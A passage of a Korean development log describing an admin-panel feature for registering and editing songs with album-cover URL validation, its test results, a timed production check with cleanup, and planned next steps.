- `src/lib/songs/song-schema.ts`(신규): 서버와 같은 규칙(제목 200자·가수 100자, 가수 필수)의 zod 스키마
- `src/lib/songs/album-cover-url.ts`(신규): 서버와 같은 판정을 하되 **거부 사유를 구체적으로 반환**(서버는 공통 400 메시지만 줌). 100x100 같은 다른 크기 꼬리표는 "주소 끝이 600x600bb.jpg 여야 합니다"로 특정해 안내(§10 요건) + 공개 사이트의 `shrinkAlbumCoverUrl`과 같은 규칙의 썸네일 축소 함수
- `src/lib/csp.ts`: `ALBUM_COVER_IMAGE_ORIGIN` 상수 추가, img-src에 항상 포함
- `src/components/songs/`(신규): `song-form-dialog.tsx`(등록·수정 통합, 수정 시 검토상태 되돌림 안내), `song-table.tsx`(커버 썸네일 + 유튜브 검토상태 배지), `album-cover-dialog.tsx`(후보/URL 토글), `songs-page-client.tsx`(SplitPanel 연결)
- `src/app/(admin)/songs/page.tsx`: 자리표시 화면을 `SongsPageClient`로 교체

### 검증

- **정적 검증**: typecheck·lint·test(162개, 앨범 커버 URL 판정·CSP 오리진 테스트 포함)·build 전부 통과
- **프로덕션 실동작 검증 — 최소 노출 시간 원칙 적용**: 임시 팀(`__verify__곡테스트`) 생성 → 곡 등록·중복 시도·수정 → 앨범 커버 후보 선택 → URL 직접 입력 거부 케이스 → 정리를 연속 진행, 전 단계 타임스탬프(UTC) 기록

  | 단계 | 시각 |
  | --- | --- |
  | 기준선(`Line Up` 15행, `Setlist` 64행) | 14:50:03 |
  | 사용자 작업 완료 보고 | 14:56:36 |
  | 정리 SQL 실행(곡 → 팀 순서) | 14:58:33 |
  | 정리 완료 확인(diff=0) | 14:58:37 |

  노출 시간 약 8분(등록·수정·커버 반영·거부 케이스까지 전부 수행한 시간 포함). 정리 후 `Line Up` 15행·`Setlist` 64행으로 기준선과 diff=0 확인

- **뜻밖의 관찰 — 중복 등록 케이스가 의도대로 재현되지 않음**: 사용자가 3단계(중복 등록 확인)에서 제목·가수 입력 칸을 바꿔 넣어(`title="이승윤", singer="폭포"` vs 원래 `title="폭포", singer="이승윤"`), 서버 입장에서는 (title, singer) 쌍이 달라 **중복이 아닌 별개 곡 2건**이 생성됐다(409 미발생). 409 자체는 §12 서버 단위 테스트에서 이미 검증돼 있어 재검증 필요성은 낮다고 판단해 추가 시도는 하지 않았다. 두 사용자가 정확히 같은 (제목, 가수) 쌍을 입력해야 발생하는 흔치 않은 경합이라 UI가 별도로 막을 필요는 없다고 본다
- **URL 직접 입력 거부 케이스 확인**: 100x100 크기 주소를 붙여 넣었을 때 화면에 정확히 "주소 끝이 600x600bb.jpg 여야 합니다. 크기 부분만 바꿔서 다시 시도해 주세요."가 떴다(사용자 확인). 앨범 커버 후보 선택 → 반영도 정상 동작(사용자 확인, `album` 컬럼에 실제로 URL이 채워진 것을 DB로도 확인)

### 완료 상태 및 다음 단계

- 브랜치 `feature/admin-song-crud`(`develop`에서 분기), 푸시·PR 보류
- 곡 삭제 UI는 이번 범위에서 제외했다(팀과 동일 이유 — 백엔드 API 부재)
- **다음**: 7c-4 유튜브 연결 관리(F011~F013, 배치 추천 검색·리뷰) → 7d 배포

## 부록: 원본 리포트 참조

- `lighthouse-before-home-0831.html` / `.json`
- `lighthouse-before-setlist-0831.html` / `.json`
- `lighthouse-before-event-0831.html` / `.json`
